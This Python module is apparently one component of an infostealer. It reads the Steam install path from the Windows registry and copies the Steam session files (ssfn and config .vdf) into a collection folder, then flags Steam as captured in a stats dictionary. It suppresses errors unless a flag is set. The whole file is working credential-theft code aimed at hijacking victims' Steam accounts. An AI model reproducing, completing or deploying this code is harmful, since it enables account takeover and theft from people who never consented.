from shutil import copyfile
from os import listdir, path, makedirs
import winreg

from ..utils.config import SteamConfig, programs_stats

class Steam:

    def __init__(self, *args):

        self.config = SteamConfig()

        for index, variable in enumerate(self.config.Variables):
            self.__dict__.update({variable: args[index]})


    def __create_folder(self):

        folder = rf"{self.storage_path}/{self.folder}/config"

        if not path.exists(folder):
            makedirs(folder)

    def __find_path(self):

        root = winreg.OpenKey(winreg.HKEY_CURRENT_USER, self.config.RegPath, 0)
        steam_path, _ = winreg.QueryValueEx(root, "SteamPath")
        return steam_path

    def __get_session(self):

        steam_path = self.__find_path()

        if not path.exists(steam_path):
            return

        folder = rf"{self.storage_path}/{self.folder}"

        ssfn_fiels = [file for file in listdir(steam_path) if "ssfn" in file]
        vdf_files = ['config/'+file for file in listdir(f'{steam_path}/config') if "vdf" in file]

        if not ssfn_fiels or not vdf_files:
            return

        self.__create_folder()

        for file in ssfn_fiels + vdf_files:
            copyfile(f"{steam_path}/{file}", f"{folder}/{file}")

        programs_stats['Steam'] = True


    def run(self):
        try:

            self.__get_session()

        except Exception as e:
            if self.errors is True: print(f"[Steam]: {repr(e)}")